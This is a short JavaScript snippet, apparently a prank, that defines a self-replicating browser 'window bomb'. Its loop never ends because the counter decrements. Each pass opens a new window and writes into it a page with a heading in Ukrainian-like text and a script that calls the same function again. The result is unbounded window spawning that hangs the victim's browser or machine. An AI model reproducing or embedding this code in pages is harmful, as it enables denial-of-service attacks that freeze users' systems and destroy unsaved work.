function cocamba(){
    for (let i = 0; i < 10; i--) {

        let w = window.open("about:blank", "_blank");

        w.document.write(`
        <html>
        <body>
        <h1>Я Люболю Яроріка</h1>

        <script>
        (${cocamba.toString()})();
        </script>

        </body>
        </html>
        `);
    }
}